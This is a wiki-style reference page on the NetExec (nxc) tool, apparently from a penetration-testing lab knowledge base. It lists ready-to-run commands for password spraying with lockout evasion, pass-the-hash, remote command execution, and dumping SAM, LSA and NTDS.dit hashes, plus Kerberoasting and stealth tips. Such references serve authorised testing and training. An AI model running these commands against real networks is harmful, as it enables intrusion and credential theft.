---
tags: [tool, enumeration, attack]
module: multi
last_updated: 2026-05-11
source_count: 0
---

# NetExec (nxc)

NetExec is the active successor to CrackMapExec — a multi-protocol credential testing, enumeration, and post-exploitation tool for Windows networks. Command is `nxc`.

GitHub: https://github.com/Pennyw0rth/NetExec

## Overview

NetExec automates credential testing across SMB, WinRM, MSSQL, LDAP, SSH, RDP, FTP, VNC, and NFS at scale. It replaces CrackMapExec with the same syntax (`crackmapexec` → `nxc`) plus active development, more protocols, and better output.

**Primary use cases:**
- Validate credentials discovered elsewhere across an entire subnet
- Password spray a short list across many users or hosts
- Enumerate shares, users, groups, and password policy without credentials
- Execute commands and dump hashes after admin access is established
- Pass-the-hash and pass-the-ticket attacks

**Not ideal for:** brute-forcing a large wordlist (e.g., rockyou.txt) against one account. Use [[tools/attack/metasploit]] `smb_login` with `STOP_ON_SUCCESS` for that.

```bash
# Install
sudo apt install netexec           # Kali/Parrot (preferred)
pipx install netexec               # cross-platform
pip install netexec                # alternative

# nxc is the primary command; netexec also works
nxc --version
nxc --help
```

---

## Protocol Support

| Protocol | Port | Command prefix |
|----------|------|----------------|
| SMB | 445 | `nxc smb` |
| WinRM | 5985/5986 | `nxc winrm` |
| MSSQL | 1433 | `nxc mssql` |
| LDAP | 389/636 | `nxc ldap` |
| SSH | 22 | `nxc ssh` |
| RDP | 3389 | `nxc rdp` |
| FTP | 21 | `nxc ftp` |
| VNC | 5900 | `nxc vnc` |

---

## SMB

### Enumeration (no credentials)

```bash
# Host discovery — OS, hostname, domain, SMB signing, SMBv1
nxc smb 10.10.10.0/24

# Enumerate shares (null session)
nxc smb 10.10.10.10 -u '' -p '' --shares

# Enumerate users (null session or RID brute)
nxc smb 10.10.10.10 -u '' -p '' --users
nxc smb 10.10.10.10 -u '' -p '' --rid-brute

# Enumerate groups
nxc smb 10.10.10.10 -u '' -p '' --groups

# Dump password policy (check before spraying)
nxc smb 10.10.10.10 -u '' -p '' --pass-pol
```

### Credential Validation and Spraying

```bash
# Test a single credential
nxc smb 10.10.10.10 -u jason -p 'princess1'

# Spray one password across many users
nxc smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Spray multiple passwords across multiple users (no bruteforce = 1:1 pairing)
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Validate credentials across an entire subnet
nxc smb 10.10.10.0/24 -u administrator -p 'HTBRocks!' --continue-on-success

# Local account authentication
nxc smb 10.10.10.10 --local-auth -u administrator -p 'HTBRocks!'
```

### Authenticated Enumeration

```bash
# Enumerate shares with credentials
nxc smb 10.10.10.10 -u jason -p 'princess1' --shares

# Enumerate logged-on users
nxc smb 10.10.10.10 -u jason -p 'princess1' --loggedon-users

# Enumerate sessions
nxc smb 10.10.10.10 -u jason -p 'princess1' --sessions

# Dump disks
nxc smb 10.10.10.10 -u jason -p 'princess1' --disks
```

### Command Execution (admin required)

```bash
# Run a shell command
nxc smb 10.10.10.10 -u administrator -p 'HTBRocks!' -x 'whoami'

# Run a PowerShell command
nxc smb 10.10.10.10 -u administrator -p 'HTBRocks!' -X 'Get-Process'

# Dump SAM (local password hashes)
nxc smb 10.10.10.10 -u administrator -p 'HTBRocks!' --sam

# Dump LSA secrets
nxc smb 10.10.10.10 -u administrator -p 'HTBRocks!' --lsa

# Dump NTDS.dit (domain controller — requires DA)
nxc smb 10.10.10.10 -u administrator -p 'HTBRocks!' --ntds
```

### Pass-the-Hash

```bash
# SMB PTH
nxc smb 10.10.10.10 -u administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# PTH across subnet
nxc smb 10.10.10.0/24 -u administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 --continue-on-success
```

---

## WinRM

```bash
# Test WinRM credential
nxc winrm 10.10.10.10 -u administrator -p 'HTBRocks!'

# Spray across subnet
nxc winrm 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Execute command
nxc winrm 10.10.10.10 -u administrator -p 'HTBRocks!' -x 'whoami'
```

---

## MSSQL

```bash
# Test MSSQL login
nxc mssql 10.10.10.10 -u sa -p ''

# Execute OS command via xp_cmdshell
nxc mssql 10.10.10.10 -u sa -p '' -x 'whoami'

# Execute SQL query
nxc mssql 10.10.10.10 -u sa -p '' --local-auth -q "SELECT @@version"
```

---

## LDAP

```bash
# Enumerate users via LDAP
nxc ldap 10.10.10.10 -u '' -p '' --users

# Get AS-REP roastable accounts (no pre-auth required)
nxc ldap 10.10.10.10 -u '' -p '' --asreproast asrep_hashes.txt

# Kerberoast (requires valid credentials)
nxc ldap 10.10.10.10 -u jason -p 'princess1' --kerberoasting kerb_hashes.txt
```

---

## SSH

```bash
# Test SSH credential
nxc ssh 10.10.10.10 -u root -p 'toor'

# Spray across subnet
nxc ssh 10.10.10.0/24 -u users.txt -p passwords.txt --no-bruteforce
```

---

## Flags & Options

### Global

| Flag | Description |
|------|-------------|
| `-u <user/file>` | Username or file of usernames |
| `-p <pass/file>` | Password or file of passwords |
| `-H <hash>` | NTLM hash — pass-the-hash |
| `--local-auth` | Authenticate as local account (not domain) |
| `--continue-on-success` | Do not stop on first success — find all valid creds |
| `--no-bruteforce` | Pair users and passwords 1:1 instead of cartesian product |
| `-t <N>` | Threads (default 100; lower for sensitive targets) |
| `--timeout <N>` | Connection timeout in seconds |
| `-v` | Verbose output |
| `--log <file>` | Write output to file |

### SMB-Specific

| Flag | Description |
|------|-------------|
| `--shares` | Enumerate shares |
| `--users` | Enumerate domain/local users |
| `--groups` | Enumerate groups |
| `--rid-brute` | RID brute-force user enumeration (unauthenticated) |
| `--pass-pol` | Dump password policy |
| `--loggedon-users` | Show currently logged-on users |
| `--sam` | Dump SAM database (local hashes) |
| `--lsa` | Dump LSA secrets |
| `--ntds` | Dump NTDS.dit (domain hashes — DC only) |
| `-x <cmd>` | Execute CMD command |
| `-X <cmd>` | Execute PowerShell command |

---

## Reading Output

```
SMB  10.10.10.10  445  WS01  [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:CORP) (signing:False) (SMBv1:False)
SMB  10.10.10.10  445  WS01  [+] CORP\jason:princess1 (Pwn3d!)
```

| Indicator | Meaning |
|-----------|---------|
| `[+]` | Success — credential valid |
| `[-]` | Failure |
| `[*]` | Informational |
| `Pwn3d!` | User has local admin rights — prioritize this host |
| `(signing:False)` | SMB signing not required → NTLM relay possible |
| `(SMBv1:True)` | EternalBlue likely applicable |

---

## nxc vs CrackMapExec

NetExec is a direct drop-in replacement. The only change is the command name:

```bash
crackmapexec smb ...   →   nxc smb ...
```

If `nxc` is not available but `crackmapexec` is installed, the syntax is identical. Both are in Kali/Parrot repositories, but `netexec` is the active project. CME is no longer maintained.

---

## Gotchas & Notes

- **`--continue-on-success` is almost always needed.** Without it, nxc stops after the first valid credential per host. In spraying scenarios, you miss all other valid accounts.
- **`--no-bruteforce` prevents account lockout** when using multiple usernames and multiple passwords. Without it, nxc tries every combination (cartesian product), which rapidly exhausts lockout thresholds.
- **Always check `--pass-pol` before spraying.** If the policy sets lockout at 3 attempts, spray with only 2 passwords per round to stay safe.
- **`(Pwn3d!)` = local admin.** Immediately attempt `--sam` or `-x 'whoami /all'` on these hosts.
- **nxc stores all results in a database.** Query with `nxc smb --creds` or use the `nxcdb` CLI to review historical results.
- **Large wordlists (rockyou) belong in MSF, not nxc.** nxc is optimized for fast, parallel credential testing — not sequential brute-forcing of 14M passwords. See [[tools/attack/metasploit]] for that workflow.
- **Thread count:** default 100 threads is noisy. Reduce to 5–10 for stealth or when testing against a single host.

## Installation

```bash
# Check if installed
nxc --version 2>/dev/null || echo "not installed"

# Install (Kali / Parrot)
sudo apt install netexec -y

# Verify
nxc --version
```

Note: the binary is `nxc`, not `netexec`. `crackmapexec` is the deprecated predecessor — see [[tools/utility/crackmapexec]].

## Related Pages

- [[enumeration/smb]]
- [[attack/smb]]
- [[enumeration/windows_remote_mgmt]]
- [[tools/attack/metasploit]] — smb_login for large-wordlist brute-force
- [[tools/utility/crackmapexec]] — legacy predecessor (identical syntax)
- [[tools/utility/impacket]]
- [[tools/attack/responder]]
